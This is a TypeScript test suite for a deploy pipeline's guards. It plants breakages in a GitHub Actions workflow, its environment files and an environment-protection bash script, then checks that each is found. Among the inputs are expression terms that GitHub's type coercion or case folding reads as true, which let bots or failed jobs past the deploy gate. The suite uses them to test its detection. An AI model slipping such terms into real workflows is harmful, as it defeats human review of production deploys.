        text = edited(without, `      - name: ${before}\n`, `${step}      - name: ${before}\n`, job(stage))
      }
      return withText(DEPLOY, text)
    }
    // Just after Deploy Services, just before the Probe, and after the Probe.
    for (const before of ['Roll back to the target', 'Probe', 'Read back what runs']) {
      expect(prodPathFindings(moved(before)), before).toEqual([later('nonprod'), later('prod')])
    }
    // One job alone.
    expect(prodPathFindings(movedStep('prod', mark, 'Read back what runs'))).toEqual([later('prod')])
    // The output read from a later step's id, and a step the mark must precede gone.
    const output = `      services_started: \${{ steps.mark.outputs.services_started }}\n`
    expect(
      prodPathFindings(
        plant(output, `      services_started: \${{ steps.readback.outputs.services_started }}\n`, job('nonprod')),
      ),
    ).toContain(later('nonprod'))
    expect(prodPathFindings(removedStep('prod', 'Probe'))).toContain(later('prod'))
    expect(prodPathFindings(removedStep('nonprod', mark))).toContain(later('nonprod'))
  })

  // Round 12's third iteration, its second pass: the mark's place, the rollback's if: and the pinned runs were each
  // held, but never the value the mark writes against the one the if: compares, so services_started written as
  // the run's attempt, as yes or as "true " (GitHub compares strings whole, ignoring case alone) passed every rule
  // and read as not 'true': a release whose smoke failed stayed live with no rollback. rolled written so left the
  // rollback with no resmoke and no record. Each value is changed here in both copies, as the guard's constant
  // and deploy.yml would change together.
  it('holds services_started and rolled to the value their jobs’ if: compares', () => {
    const marked = (stage: 'nonprod' | 'prod') =>
      at(
        stage,
        `writes services_started on one line alone, echo "services_started=true" >>"$GITHUB_OUTPUT", the value rollback-${stage}'s if: compares ('true')`,
      )
    const rolled = (stage: 'nonprod' | 'prod') =>
      at(
        `rollback-${stage}`,
        `writes rolled on one line alone, echo "rolled=true" >>"$GITHUB_OUTPUT", from the step its rolled output reads first, the value resmoke-${stage}'s if: compares ('true') as written, so the resmoke and its record follow a rollback`,
      )
    const markLine = '          echo "services_started=true" >>"$GITHUB_OUTPUT"\n'
    const doneLine = '          echo "rolled=true" >>"$GITHUB_OUTPUT"\n'
    const values = (planted: ReadonlyMap<string, string>) =>
      prodPathFindings(planted).filter(each => each.includes(' on one line alone, '))
    const everywhere = (from: string, to: string) => {
      expect(deployText.split(from).length - 1, from).toBe(2)
      return withText(DEPLOY, deployText.replaceAll(from, to))
    }
    for (const value of ['$GITHUB_RUN_ATTEMPT', 'yes', 'true ']) {
      expect(values(everywhere(markLine, markLine.replace('=true"', `=${value}"`))), value).toEqual([
        marked('nonprod'),
        marked('prod'),
      ])
      expect(values(everywhere(doneLine, doneLine.replace('=true"', `=${value}"`))), value).toEqual([
        rolled('nonprod'),
        rolled('prod'),
      ])
    }
    // A second write after the first, and a comment on the line.
    expect(
      values(everywhere(markLine, `${markLine}          echo "services_started=false" >>"$GITHUB_OUTPUT"\n`)),
    ).toEqual([marked('nonprod'), marked('prod')])
    expect(values(everywhere(doneLine, doneLine.replace('\n', ' # the rollback ran\n')))).toEqual([
      rolled('nonprod'),
      rolled('prod'),
    ])
    // The resmoke comparing another value, and the output read from the AWS check alone.
    expect(
      prodPathFindings(
        plant("needs.rollback-prod.outputs.rolled == 'true'", "needs.rollback-prod.outputs.rolled == 'yes'"),
      ),
    ).toEqual([rolled('prod')])
    expect(
      prodPathFindings(
        plant(
          `      rolled: \${{ steps.done.outputs.rolled || steps.aws.outputs.rolled }}\n`,
          `      rolled: \${{ steps.aws.outputs.rolled }}\n`,
          job('rollback-nonprod'),
        ),
      ),
    ).toEqual([rolled('nonprod')])
  })

  it('holds the repository', () => {
    expect(prodPathFindings(workflows)).toEqual([])
  })

  // SECURITY-01: the gate's choice among ci.yml's runs on the pull request's head, run with bash and jq: the newest
  // from the pull request's own head repository and branch whose latest attempt started (run_started_at, which a
  // re-run resets) while the pull request was open, from its created_at to its merged_at, both ends counted.
  it('chooses the pull request’s own run, never another fork’s newer one at the same commit', () => {
    const line = PULL_CHECKS.split('\n').find(each => each.startsWith('RUN_ID=')) ?? ''
    expect(line).not.toBe('')
    const head = 'a'.repeat(40)
    const ci = '.github/workflows/ci.yml'
    const created = '2026-11-01T00:00:00Z'
    const merged = '2026-11-02T00:00:00Z'
    const run = (
      id: number,
      repo: number | null,
      branch: string,
      sha = head,
      path = ci,
      started: string | null = '2026-11-01T12:00:00Z',
    ) => ({
      id,
      path,
      head_sha: sha,
      head_branch: branch,
      head_repository: repo === null ? null : { id: repo },
      ...(started === null ? {} : { run_started_at: started }),
    })
    const choose = (pull: unknown, runs: unknown[]) =>
      execFileSync('bash', ['-c', `set -euo pipefail\n${line}\nprintf '%s' "$RUN_ID"`], {
        encoding: 'utf8',
        stdio: ['ignore', 'pipe', 'pipe'],
        env: {
          PATH: process.env.PATH ?? '',
          HEAD: head,
          PULL: JSON.stringify(pull),
          RUNS: JSON.stringify({ workflow_runs: runs }),
        },
      })
    const own = {
      number: 7,
      created_at: created,
      merged_at: merged,
      head: { sha: head, ref: 'feature', repo: { id: 11 } },
    }
    const runs = [
      run(100, 11, 'feature'),
      run(105, 99, 'feature'),
      run(106, 11, 'another'),
      run(107, 11, 'feature', 'b'.repeat(40)),
      run(108, 11, 'feature', head, '.github/workflows/other.yml'),
    ]
    expect(choose(own, runs)).toBe('100')
    expect(choose(own, [...runs, run(101, 11, 'feature')])).toBe('101')
    // A merged pull request whose head repository is gone matches no run, so its checks read as missing.
    expect(choose({ ...own, head: { ...own.head, repo: null } }, [...runs, run(109, null, 'feature')])).toBe('')
    // A run whose latest attempt started after the merge (a re-run, whatever it concluded) or before the pull
    // request was opened isn't counted, nor one with no start time: the newest counted run is chosen, and with
    // none the step's checks read as missing. The window's two ends count.
    const after = run(110, 11, 'feature', head, ci, '2026-11-02T00:00:01Z')
    const before = run(111, 11, 'feature', head, ci, '2026-10-31T23:59:59Z')
    const unstarted = run(112, 11, 'feature', head, ci, null)
    expect(choose(own, [...runs, after, before, unstarted])).toBe('100')
    for (const each of [after, before, unstarted]) expect(choose(own, [each]), JSON.stringify(each)).toBe('')
    expect(choose(own, [run(113, 11, 'feature', head, ci, created)])).toBe('113')
    expect(choose(own, [run(113, 11, 'feature', head, ci, created), run(114, 11, 'feature', head, ci, merged)])).toBe(
      '114',
    )
    // A start time that isn't GitHub's date-time fails the step, as an unreadable answer does.
    expect(() => choose(own, [run(115, 11, 'feature', head, ci, '2026-11-01 12:00')])).toThrow()
    // A full page of runs may leave the newest counted one unread, so none is chosen; one fewer is read whole.
    const page = (count: number) => Array.from({ length: count }, (_, i) => run(200 + i, 11, 'feature'))
    expect(choose(own, page(100))).toBe('')
    expect(choose(own, page(99))).toBe('298')
  })

  // GitHub ties no ci.yml run to the pull request that started it (a run's pull_requests lists only open ones that
  // match its head), so a run of another pull request from the same head at the same commit, into another base, has
  // the same head, repository and branch, and would read as the merged one's: a failed run passed and a green one
  // was refused. The step, run whole with bash and jq against a stand-in gh, reads every page of the pull requests
  // from the merged one's head label and writes shared when another of them, in any state, was open at any moment
  // while the merged one was or has its head commit, or when that listing can't be read whole; one that closed
  // before the merged one opened, at another commit, leaves it unshared (Renovate reuses its branch names). And
  // history.ts plan, fed what the step wrote, deploys or refuses.
  it('writes shared when another pull request from its head could have made its run, and deploys Renovate’s reuse', async () => {
    const head = 'a'.repeat(40)
    const sha = 'c'.repeat(40)
    const created = '2026-11-10T00:00:00Z'
    const merged = '2026-11-12T00:00:00Z'
    const pullOf = (label: string, body: string) => ({
      number: 7,
      body,
      created_at: created,
      closed_at: merged,
      merged_at: merged,
      merge_commit_sha: sha,
      base: { ref: 'main' },
      head: { sha: head, ref: 'feature', label, repo: { id: 11 } },
    })
    type Listed = { number: number; created_at: string; closed_at: string | null; head: { label: string; sha: string } }
    const listed = (
      number: number,
      opened: string,
      closed: string | null,
      at = 'b'.repeat(40),
      label = 'example:feature',
    ): Listed => ({ number, created_at: opened, closed_at: closed, head: { label, sha: at } })
    const self = (label = 'example:feature'): Listed => listed(7, created, merged, head, label)
    const gh = [
      'gh() {',
      '  local answer page',
      '  case "$2" in',
      '    "repos/$REPO/commits/$SHA/pulls") answer=$(<"$RUNNER_TEMP/pulls.json") ;;',
      `    "repos/$REPO/git/commits/${head}") answer='{"tree": {"sha": "${'d'.repeat(40)}"}}' ;;`,
      '    "repos/$REPO/pulls?state=all&head=$WANTED&sort=created&direction=asc&per_page=100&page="[1-9]*)',
      `      page=\${2##*&page=}`,
      '      printf \'%s\\n\' "$page" >>"$RUNNER_TEMP/pages"',
      '      answer=$(jq -c --argjson page "$page" \'.[$page - 1] // []\' "$RUNNER_TEMP/pages.json") ;;',
      `    "repos/$REPO/actions/runs?head_sha=${head}&event=pull_request&per_page=100") answer=$ANSWER_RUNS ;;`,
      '    "repos/$REPO/actions/runs/900/jobs?per_page=100") answer=$ANSWER_JOBS ;;',
      '    *) echo "no answer for $2" >&2; return 1 ;;',
      '  esac',
      `  if [ "\${3:-}" = --jq ]; then jq -r "$4" <<<"$answer"; else printf '%s\\n' "$answer"; fi`,
      '}',
    ].join('\n')
    const runOf = (started: string) => ({
      workflow_runs: [
        {
          id: 900,
          path: '.github/workflows/ci.yml',
          head_sha: head,
          head_branch: 'feature',
          head_repository: { id: 11 },
          run_started_at: started,
        },
      ],
    })
    const jobs = {
      jobs: [
        { name: 'check', conclusion: 'success' },
        { name: 'migrations', conclusion: 'success' },
      ],
    }
    const step = (
      pages: ReadonlyArray<readonly Listed[]>,
      {
        label = 'example:feature',
        wanted = 'example%3Afeature',
        started = '2026-11-11T00:00:00Z',
        body = 'Bumps a version.',
      } = {},
    ) => {
      const temp = mkdtempSync(join(tmpdir(), 'hearth-pull-checks-'))
      try {
        // The pages and the pull request go in files: ten full pages, or a long body, are longer than one
        // environment variable may be.
        writeFileSync(join(temp, 'pages.json'), JSON.stringify(pages))
        writeFileSync(join(temp, 'pulls.json'), JSON.stringify([pullOf(label, body)]))
        const result = spawnSync('bash', ['-c', `${gh}\n${PULL_CHECKS}`], {
          encoding: 'utf8',
          env: {
            PATH: process.env.PATH ?? '',
            RUNNER_TEMP: temp,
            REPO: 'example/hearth',
            SHA: sha,
            MODE: 'deploy',
            TARGET: 'prod',
            WANTED: wanted,
            ANSWER_RUNS: JSON.stringify(runOf(started)),
            ANSWER_JOBS: JSON.stringify(jobs),
          },
        })
        const path = join(temp, 'checks.json')
        const asked = existsSync(join(temp, 'pages'))
          ? readFileSync(join(temp, 'pages'), 'utf8').trim().split('\n')
          : []
        return {
          checks:
            result.status === 0 && existsSync(path)
              ? parsePullChecks(JSON.parse(readFileSync(path, 'utf8')))
              : `exit ${result.status}`,
          pages: asked.map(Number),
        }
      } finally {
        rmSync(temp, { recursive: true, force: true })
      }
    }
    const written = (...args: Parameters<typeof step>) => step(...args).checks
    const deployed = {
      pull: 7,
      base: 'main',
      mergeCommit: sha,
      headTree: 'd'.repeat(40),
      shared: false,
      check: 'success',
      migrations: 'success',
    }
    expect(step([[self()]])).toEqual({ checks: deployed, pages: [1] })
    // A body its author (or anyone who can push to its head, after the merge) made long, in multi-byte or escaped
    // characters, writes the same: the step keeps only the fields it reads, since Linux refuses one argument over
    // 128 KiB, and the pull request is one of jq's (COMMANDS-G1-01, round 12).
    expect(written([[self()]], { body: '\u754c'.repeat(70_000) })).toEqual(deployed)
    expect(written([[self()]], { body: '"\\\n'.repeat(70_000) })).toEqual(deployed)
    // Renovate's reuse: earlier pull requests from the same branch name, merged or closed before this one opened,
    // each at another commit, leave it unshared, in any order, up to the second before it opened.
    const earlier = [
      listed(3, '2026-09-01T00:00:00Z', '2026-09-02T00:00:00Z'),
      listed(5, '2026-10-01T00:00:00Z', '2026-11-09T23:59:59Z', 'e'.repeat(40)),
    ]
    expect(written([[...earlier, self()]])).toEqual(deployed)
    expect(written([[self(), ...earlier]])).toEqual(deployed)
    // Another pull request from the head open at any moment while the merged one was, from its created_at to its
    // merged_at, both ends counted, or still open, or at its head commit whenever it was open, shares it.
    const overlapping: ReadonlyArray<readonly [string, Listed]> = [
      ['closed as it opened', listed(5, '2026-10-01T00:00:00Z', created)],
      ['closed while it was open', listed(5, '2026-10-01T00:00:00Z', '2026-11-11T00:00:00Z')],
      ['open across it', listed(5, '2026-10-01T00:00:00Z', null)],
      ['opened while it was open', listed(9, '2026-11-11T00:00:00Z', null)],
      ['opened as it merged', listed(9, merged, '2026-11-13T00:00:00Z')],
      ['closed long before, at its head commit', listed(3, '2026-09-01T00:00:00Z', '2026-09-02T00:00:00Z', head)],
      ['opened after it merged, at its head commit', listed(9, '2026-11-20T00:00:00Z', null, head)],
    ]
    for (const [name, other] of overlapping) {
      expect(written([[other, self()]]), name).toEqual({ ...deployed, shared: true })
    }
    // One opened after the merge, at another commit, leaves it unshared: none of its runs started in the window.
    expect(written([[self(), listed(9, '2026-11-12T00:00:01Z', null)]])).toEqual(deployed)
    // The listing is read whole or the head is shared: a full page reads the next, up to ten, and a tenth full page
    // is refused without an eleventh read; the merged pull request is in it once, and every entry is from its head.
    const closed = (n: number) => listed(1000 + n, '2026-01-01T00:00:00Z', '2026-01-02T00:00:00Z')
    const full = (from: number) => Array.from({ length: 100 }, (_, i) => closed(from + i))
    expect(step([[...full(0).slice(1), self()], []])).toEqual({ checks: deployed, pages: [1, 2] })
    expect(step([full(0), [self(), closed(100)]])).toEqual({ checks: deployed, pages: [1, 2] })
    const ten = Array.from({ length: 10 }, (_, i) => full(100 * i))
    ten[0] = [...full(0).slice(1), self()]
    expect(step(ten)).toEqual({ checks: { ...deployed, shared: true }, pages: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] })
    expect(step([...ten.slice(0, 9), full(900).slice(1)])).toEqual({
      checks: deployed,
      pages: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10],
    })
    for (const [name, pages] of [
      ['empty', [[]]],
      ['without it', [earlier]],
      ['with it twice', [[self(), self()]]],
      ['with it on two pages', [[...full(0).slice(1), self()], [self()]]],
      [
        'another head’s',
        [[self(), listed(9, '2026-01-01T00:00:00Z', '2026-01-02T00:00:00Z', 'b'.repeat(40), 'x:feature')]],
      ],
    ] as const) {
      expect(written(pages), name).toEqual({ ...deployed, shared: true })
    }
    // A run re-run after the merge isn't counted, so with no other its checks read as missing and history.ts
    // refuses; one started before the merge is counted.
    expect(written([[self()]], { started: '2026-11-12T00:00:01Z' })).toEqual({
      ...deployed,
      check: 'missing',
      migrations: 'missing',
    })
    expect(written([[self()]], { started: merged })).toEqual(deployed)
    // The label is read whole and asked for encoded, a branch name's own & and / among it.
    expect(written([[self('example:a/b&c')]], { label: 'example:a/b&c', wanted: 'example%3Aa%2Fb%26c' })).toEqual(
      deployed,
    )
    // A label that isn't an owner and a branch fails the step, as an unreadable head does.
    for (const label of ['feature', 'example:', 'exa mple:feature', 'example:a\nb']) {
      expect(written([[self(label)]], { label }), label).toMatch(/^exit [1-9]\d*$/)
    }
    // history.ts plan over what the step wrote: Renovate's reuse deploys; an overlapping pull request is refused
    // pr-head-shared, and a run re-run after the merge pr-checks-failed.
    const decided = async (checks: ReturnType<typeof written>) => {
      if (typeof checks === 'string') return checks
      const tree = checks.headTree
      const result = await plan({
        event: 'push',
        ref: 'refs/heads/main',
        actor: 'a-person',
        triggeringActor: 'a-person',
        sha,
        target: '',
        mode: '',
        release: '',
        restore: '',
        records: { nonprod: [], prod: [] },
        checks,
        treeOf: () => tree,
        isAncestor: () => true,
        floorsAllowed: () => true,
        expansionsMet: () => true,
        domains: ['app.hearth.example', 'content.hearth.example'],
      })
      return result.ok ? 'allowed' : result.reason
    }
    expect(await decided(written([[...earlier, self()]]))).toBe('allowed')
    expect(await decided(written([[listed(9, '2026-11-11T00:00:00Z', null), self()]]))).toBe('pr-head-shared')
    expect(await decided(written([[self()]], { started: '2026-11-12T00:00:01Z' }))).toBe('pr-checks-failed')
  })
})

describe('DPW-09 (C11-D49, C11-D56, C11-D59, C11-D69): the gate, the bot test and the environments', () => {
  const at = (id: string, rule: string) => `${DEPLOY}: DPW-09 ${id}: ${rule}`
  const BOT = 'its if: starts with the bot test on github.triggering_actor and github.actor, and no bot passes it'
  const holds = PROFILES.nonprod.holdsRealData
  const gate = (
    planted: ReadonlyMap<string, string>,
    envs = environments,
    real = holds,
    script = protectEnvironments,
  ) => gateFindings(planted, envs, real, script, AGENT_MARKERS)
  const envFile = (name: string, change: (record: Record<string, unknown>) => void) => {
    const path = `.github/environments/${name}`
    const record = JSON.parse(environments.get(path) ?? '{}') as Record<string, unknown>
    change(record)
    return new Map([...environments, [path, JSON.stringify(record)]])
  }

  it('finds each planted breakage in the workflow', () => {
    const bot = `\${{ ${BOT_TEST} && `
    expect(gate(plant(bot, `\${{ `, job('nonprod')))).toEqual([at('nonprod', BOT)])
    expect(gate(plant(bot, `\${{ `, job('record-nonprod')))).toEqual([at('record-nonprod', BOT)])
    expect(
      gate(
        plant(
          "needs.nonprod.result == 'failure') }}",
          "needs.nonprod.result == 'failure') || always() }}",
          job('record-nonprod'),
        ),
      ),
    ).toEqual([at('record-nonprod', BOT)])
    // Round 4's GUARDS-03: an if: that a person's re-run of a bot's run passes (a re-run keeps github.actor,
    // the bot, while github.triggering_actor is the person), read with the bot as github.actor alone.
    const actorOnly = "|| !endsWith(github.triggering_actor, '[bot]') && endsWith(github.actor, '[bot]') }}"
    expect(
      gate(
        plant(
          "needs.nonprod.result == 'failure') }}",
          `needs.nonprod.result == 'failure') ${actorOnly}`,
          job('record-nonprod'),
        ),
      ),
    ).toEqual([at('record-nonprod', BOT)])
    expect(
      gate(
        plant(
          "needs.rollback-nonprod.outputs.rolled == 'true' }}",
          `needs.rollback-nonprod.outputs.rolled == 'true' ${actorOnly}`,
          job('resmoke-nonprod'),
        ),
      ),
    ).toEqual([at('resmoke-nonprod', BOT)])
    expect(
      gate(
        plant(
          "(needs.gate.outputs.mode == 'deploy' || needs.gate.outputs.mode == 'rollback') && (needs.gate.outputs.target == 'prod'",
          "needs.gate.outputs.mode != 'rollback' && (needs.gate.outputs.target == 'prod'",
          job('prod-gate'),
        ),
      ),
    ).toEqual([at('prod-gate', 'its if: admits no drill: drills are non-prod’s alone')])
    expect(gate(removedStep('gate', 'The environments are live as written'))).toEqual([
      at('gate', 'runs scripts/protect-environments.sh check before it plans'),
      at('gate (The environments are live as written)', PINNED_09),
    ])
    // Round 12's lenses: a re-run of prod-plan re-runs prod-gate and prod but never the gate, so prod-gate
    // checks the environments again, just before its verdict; dropped, or moved before main's CI (which may
    // wait half an hour), prod would queue under settings nothing read since.
    const AGAIN = 'runs scripts/protect-environments.sh check just before its own verdict'
    expect(gate(removedStep('prod-gate', 'The environments are live as written'))).toEqual([
      at('prod-gate', AGAIN),
      at('prod-gate (The environments are live as written)', PINNED_09),
    ])
    expect(gate(movedStep('prod-gate', 'The environments are live as written', "Prod's release records"))).toEqual([
      at('prod-gate', AGAIN),
    ])
    expect(
      gate(
        plant(
          '      - name: The environments are live as written\n',
          `      - name: The environments are live as written\n        if: \${{ false }}\n`,
          job('prod-gate'),
        ),
      ),
    ).toEqual([at('prod-gate (The environments are live as written)', PINNED_09)])
    // An if: that skips the check on a push lets every push plan with no comparison of the live environments.
    for (const condition of ["github.event_name == 'workflow_dispatch'", 'false']) {
      expect(
        gate(
          plant(
            '      - name: The environments are live as written\n',
            `      - name: The environments are live as written\n        if: \${{ ${condition} }}\n`,
            job('gate'),
          ),
        ),
        condition,
      ).toEqual([at('gate (The environments are live as written)', PINNED_09)])
    }
    expect(gate(plant('--release "$RELEASE" --restore', '--release "" --restore', job('gate')))).toEqual([
      at('gate', 'plans through history.ts plan, every input and actor through env:'),
      at('gate (Plan)', PINNED_09),
    ])
    // An if: with !cancelled() isn't joined to success(): prod after a failed prod-gate, nonprod after a
    // failed synth, prod-gate after a failed prod-plan.
    expect(gate(plant(" && needs.prod-gate.result == 'success'", '', job('prod')))).toEqual([
      at('prod', 'its if: runs it only once synth and synth-previous-prod and prod-gate succeeded'),
    ])
    expect(gate(plant(" && needs.synth.result == 'success'", '', job('nonprod')))).toEqual([
      at('nonprod', 'its if: runs it only once synth and synth-previous-nonprod succeeded'),
    ])
    // The seventh review's first attack: each previous release is synthesised in a job of its own, which
    // the deploy waits for, so its automatic rollback has an assembly no other commit's code made.
    expect(gate(plant(" && needs.synth-previous-nonprod.result == 'success'", '', job('nonprod')))).toEqual([
      at('nonprod', 'its if: runs it only once synth and synth-previous-nonprod succeeded'),
    ])
    expect(gate(plant(" && needs.prod-plan.result == 'success' }}", ' }}', job('prod-gate')))).toEqual([
      at('prod-gate', 'its if: runs it only once gate and prod-plan succeeded'),
    ])
    // GUARDS-02: a term GitHub reads as true by its coercion or its precedence lets a bot, a drill and a failed
    // prod-gate through.
    const prodIf = "&& (needs.gate.outputs.mode == 'deploy' || needs.gate.outputs.mode == 'rollback') }}\n"
    for (const term of [
      'null == 0',
      "'0' == false",
      "!'0' == '0'",
      // Round 2's GUARDS-03: an operand whose value isn't known, and a comparison GitHub upper-cases.
      "(github.run_id || 'a') != true",
      "'\u212A' != 'k'",
      "'ſ' == 's'",
    ]) {
      expect(gate(plant(prodIf, prodIf.replace(' }}', ` || ${term} }}`), job('prod'))), term).toEqual([
        at('prod', BOT),
        at('prod', 'its if: admits no drill: drills are non-prod’s alone'),
        at('prod', 'its if: runs it only once synth and synth-previous-prod and prod-gate succeeded'),
      ])
    }
  })

  it('finds each planted breakage in the environment files and the script', () => {
    const dir = '.github/environments'
    expect(
      gate(
        workflows,
        envFile('prod.json', record => (record.required_reviewers = 0)),
      ),
    ).toEqual([`${dir}/prod.json: DPW-09 asks for at least one reviewer`])
    // Admin bypass in any environment, non-prod's included once it holds real data and asks for its
    // reviewer (ENVS-01, round 5).
    const bypass = (name: string) => `${dir}/${name}: DPW-09 lets no admin bypass its rules`
    for (const name of ['prod.json', 'prod-plan.json', 'nonprod.json']) {
      expect(
        gate(
          workflows,
          envFile(name, record => (record.can_admins_bypass = true)),
        ),
        name,
      ).toEqual([bypass(name)])
    }
    expect(
      gate(
        workflows,
        envFile('nonprod.json', record => {
          record.required_reviewers = 1
          record.can_admins_bypass = true
        }),
        true,
      ),
    ).toEqual([bypass('nonprod.json')])
    expect(
      gate(
        workflows,
        envFile('prod-plan.json', record => (record.required_reviewers = 1)),
      ),
    ).toEqual([`${dir}/prod-plan.json: DPW-09 asks for no reviewer`])
    const nonprodReviewer = `${dir}/nonprod.json: DPW-09 asks for a reviewer exactly when PROFILES.nonprod.holdsRealData is true`
    expect(
      gate(
        workflows,
        envFile('nonprod.json', record => (record.required_reviewers = 1)),
        false,
      ),
    ).toEqual([nonprodReviewer])
    expect(gate(workflows, environments, true)).toEqual([nonprodReviewer])
    expect(
      gate(
        workflows,
        envFile('nonprod.json', record => (record.required_reviewers = 1)),
        true,
      ),
    ).toEqual([])
    expect(
      gate(workflows, new Map([...environments, [`${dir}/restore.json`, environments.get(`${dir}/prod.json`) ?? '']])),
    ).toEqual([`${dir}: DPW-09 holds exactly nonprod.json, prod-plan.json and prod.json`])
    expect(
      gate(
        workflows,
        envFile('prod.json', record => (record.wait_timer = 30)),
      ),
    ).toEqual([
      `${dir}/prod.json: DPW-09 is an environment file: its name, required_reviewers, prevent_self_review, wait_timer 0, can_admins_bypass, the custom branch policy and main alone`,
    ])
    // Every change to the code the gate's check runs also moves it off its pin (EXPAND-A4-02, round 6).
    const pinned =
      'scripts/protect-environments.sh: DPW-09 runs in the gate the code pinned whole from its first code line (PROTECT_ENVIRONMENTS_SHA256), which moves only with it'
    expect(gate(workflows, environments, holds, protectEnvironments.replace('AI_AGENT CI', 'CI'))).toEqual([
      "scripts/protect-environments.sh: DPW-09 its agent markers are the Owner bootstrap script's AGENT_MARKERS",
      pinned,
    ])
    // The refusal comes first and reads the declared list alone: a second assignment, an unset, a narrowed
    // condition or a line run before it each make a finding.
    const refuses = [
      'scripts/protect-environments.sh: DPW-09 refuses every command but check under each agent marker, before anything else runs (MARKER_REFUSAL)',
      pinned,
    ]
    const plants: [string, string][] = [
      ["CLAIM_KEYS='", "AGENT_MARKERS=()\nCLAIM_KEYS='"],
      ['apply() {\n', 'apply() {\n  unset AGENT_MARKERS\n'],
      [`if [ "\${1:-}" != check ]; then`, `if [ "\${1:-}" != check ] && [ "\${1:-}" != apply ]; then`],
      ["CLAIM_KEYS='", "gh auth status\nCLAIM_KEYS='"],
      [`    if [ -n "\${!marker+x}" ]; then`, `    if [ -n "\${!marker:+x}" ]; then`],
    ]
    for (const [from, to] of plants) {
      expect(protectEnvironments.includes(from)).toBe(true)
      expect(gate(workflows, environments, holds, protectEnvironments.replace(from, to))).toEqual(refuses)
    }
    // A repo admin may run the script on a Mac, whose /bin/bash is 3.2, which stops on a parse error before
    // the refusal runs: each construct bash added later, planted alone, is found, and so is an array expanded
    // bare, which bash before 4.4 calls unbound when it is empty under set -u (review 6 ENVS-01).
    const later = (what: string) =>
      `scripts/protect-environments.sh: DPW-09 keeps to bash 3.2's syntax (BASH_AFTER_3_2): ${what}`
    const applyHead = 'apply() {\n'
    expect(protectEnvironments.split(applyHead).length).toBe(2)
    for (const [line, what] of [
      ['  [ -v PROD_REVIEWERS ] || true', 'test -v or -R'],
      ['  mapfile -t seen <"$dir/prod.json"', 'mapfile or readarray'],
      ['  declare -A seen=()', 'an associative array, nameref, global or case attribute'],
      ['  local -n ref=name', 'an associative array, nameref, global or case attribute'],
      [`  echo "\${repo,,}"`, 'a case change or @ transformation'],
      [`  echo "\${repo@Q}"`, 'a case change or @ transformation'],
      [`  echo "\${ENVIRONMENTS[-1]}"`, 'a negative subscript'],
      ['  coproc gh api user', 'coproc'],
      ['  gh api user |& cat', '|& or &>>'],
      ['  echo applying &>>"$dir/log"', '|& or &>>'],
      ['  case "$repo" in *) echo one ;& esac', 'a case fall-through'],
      ['  exec {out}>/dev/null', 'a named file descriptor'],
      ['  wait -n || true', 'wait -n, -f or -p'],
      ['  read -r -N 1 key <<<"$repo"', 'read -i or -N'],
      ["  printf '%(%F)T\\n' -1", 'printf %(…)T'],
      ['  shopt -s globstar', 'shopt'],
      ['  echo "$BASHPID"', 'a variable bash 3.2 lacks'],
      [`  for name in "\${names[@]}"; do :; done`, 'an unguarded array expansion'],
      // A test's -v or -R wherever an operand stands, a negative substring length or subscript assignment, a
      // brace step or zero padding, and & in a pattern substitution's replacement: bash 3.2 stops on the three
      // [[ tests (a parse error), fails the [ test, the substring and the assignment when they run, and expands
      // the rest otherwise than bash 5.2 (review 7 ENVS-01).
      ['  [[ -n "$repo" && -v PROD_REVIEWERS ]] || true', 'test -v or -R'],
      ['  [[ ( -v PROD_REVIEWERS ) ]] || true', 'test -v or -R'],
      ['  [[ -n "$repo" ||\n    -v PROD_REVIEWERS ]] || true', 'test -v or -R'],
      ['  [ -n "$repo" -a -v PROD_REVIEWERS ] || true', 'test -v or -R'],
      // And over a line a backslash continues, which bash reads joined, or after a bare [[ that ends its line
      // (review 8 ENVS-01).
      ['  if [[ -n "$repo" && \\\n    -v PROD_REVIEWERS ]]; then :; fi', 'test -v or -R'],
      ['  if [[\n    -v PROD_REVIEWERS ]]; then :; fi', 'test -v or -R'],
      ['  if [[ \\\n    -v PROD_REVIEWERS ]]; then :; fi', 'test -v or -R'],
      ['  if [ -n "$repo" -a \\\n    -v PROD_REVIEWERS ]; then :; fi', 'test -v or -R'],
      ['  if test \\\n    -v PROD_REVIEWERS; then :; fi', 'test -v or -R'],
      // And after a comment that ends the line before, which bash reads to its line's end whatever it holds (a
      // backslash included) and then goes on with the test: after &&, || or !, written after a blank or right
      // after the operator, or on a line a backslash joins (review 9 ENVS-01).
      ['  if [[ -n "$repo" && # why\n    -v PROD_REVIEWERS ]]; then :; fi', 'test -v or -R'],
      ['  if [[ -n "$repo" && \\\n    # why\n    -v PROD_REVIEWERS ]]; then :; fi', 'test -v or -R'],
      ['  if [[ -n "$repo" ||   # either\n    -v PROD_REVIEWERS ]]; then :; fi', 'test -v or -R'],
      ['  if [[ -n "$repo" && ! # not\n    -v PROD_REVIEWERS ]]; then :; fi', 'test -v or -R'],
      ['  if [[ -n "$repo" &&# why\n    -v PROD_REVIEWERS ]]; then :; fi', 'test -v or -R'],
      [
        '  if [[ -n "$repo" && \\\n    # why, ending in a backslash \\\n    -v PROD_REVIEWERS ]]; then :; fi',
        'test -v or -R',
      ],
      [`  echo "\${repo:0:-1}"`, 'a negative substring length'],
      ['  seen[-1]=x', 'a negative subscript'],
      ['  echo {1..7..2}', 'a brace expansion with a step or zero padding'],
      ['  echo {01..03}', 'a brace expansion with a step or zero padding'],
      [`  echo "\${repo//x/&}"`, '& in a pattern substitution'],
    ] as const) {
      const planted = protectEnvironments.replace(applyHead, `${applyHead}${line}\n`)
      expect(gate(workflows, environments, holds, planted), line).toEqual([pinned, later(what)])
    }
    // Each of those reads as it was and passes where bash 3.2 reads it as bash 5.2 does: a default value, a
    // negative offset, a plain range and a replacement with no &.
    for (const line of [
      `  echo "\${repo:-x:-y}" "\${repo: -1}" "\${repo:1:2}" {0..9} "\${repo//x/y}"`,
      '  [[ -n "$repo" && -n "$dir" ]] || true',
      '  if [[ -n "$repo" && \\\n    -n "$dir" ]]; then :; fi',
      '  if [[ -n "$repo" && # why\n    -n "$dir" ]]; then :; fi',
      '  echo \\\\\n  -v',
    ]) {
      const planted = protectEnvironments.replace(applyHead, `${applyHead}${line}\n`)
      expect(gate(workflows, environments, holds, planted), line).toEqual([pinned])
    }
    // The two lines bash 3.2 stopped on before: the refusal's test and the loop over PROD_REVIEWERS's logins.
    const guarded = `for login in \${logins[@]+"\${logins[@]}"}; do`
    const refusalTest = `    if [ -n "\${!marker+x}" ]; then`
    expect(protectEnvironments.includes(guarded) && protectEnvironments.includes(refusalTest)).toBe(true)
    expect(
      gate(workflows, environments, holds, protectEnvironments.replace(guarded, `for login in "\${logins[@]}"; do`)),
